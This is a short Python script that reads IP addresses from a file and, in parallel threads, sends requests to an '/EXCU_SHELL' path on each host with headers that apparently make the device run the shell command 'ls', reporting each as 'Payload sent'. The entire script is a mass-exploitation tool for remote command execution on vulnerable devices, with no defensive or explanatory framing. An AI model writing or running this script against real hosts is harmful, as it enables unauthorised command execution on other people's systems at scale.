import requests
import threading

with open('ips.txt', 'r') as file:
    ips = file.read().splitlines()

headers = {
    'Command1': 'ls',
    'Confirm1': 'apply'
}

def send_request(ip):
    url = f"http://{ip}/EXCU_SHELL"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        print(f"Payload sent to {url}")
    except requests.RequestException as e:
        print(f"Error sending requests to {url}: {str(e)}")

threads = []
for ip in ips:
    thread = threading.Thread(target=send_request, args=(ip,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
